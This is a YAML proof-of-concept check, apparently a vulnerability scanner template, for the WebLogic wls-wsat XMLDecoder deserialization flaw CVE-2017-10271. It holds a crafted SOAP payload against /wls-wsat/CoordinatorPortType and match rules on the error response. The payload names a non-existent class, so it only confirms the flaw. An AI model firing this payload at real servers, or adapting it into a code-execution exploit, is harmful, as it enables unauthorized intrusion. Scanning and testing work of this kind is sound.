name: poc-yaml-Weblogic-CVE-2017-10271
rules:
  - method: POST
    path: /wls-wsat/CoordinatorPortType
    headers:
      Content-Type: text/xml
    body: >-
      <soapenv:Envelope
      xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
        <soapenv:Header> 
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
            <java> 
              <void class="com.wakakaka.notexist"> 
              </void> 
            </java> 
          </work:WorkContext> 
        </soapenv:Header>  
        <soapenv:Body/> 
      </soapenv:Envelope>
    follow_redirects: true
    expression: >
      body.bcontains(b'java.beans.XMLDecoder')&&body.bcontains(b'readObject')&&body.bcontains(b'<S:Envelope')&&body.bcontains(b'ArrayIndexOutOfBoundsException')
detail:
  vulnpath: '/wls-wsat/CoordinatorPortType'
  poc_author: 'fnmsd'
  description: 'Weblogic wls-wsat XMLDecoder deserialization RCE CVE-2017-10271'
  memo: "In this Weblogic environment Java System Property com.sun.xml.ws.fault.SOAPFaultBuilder.disableCaptureStackTrace is true(default)"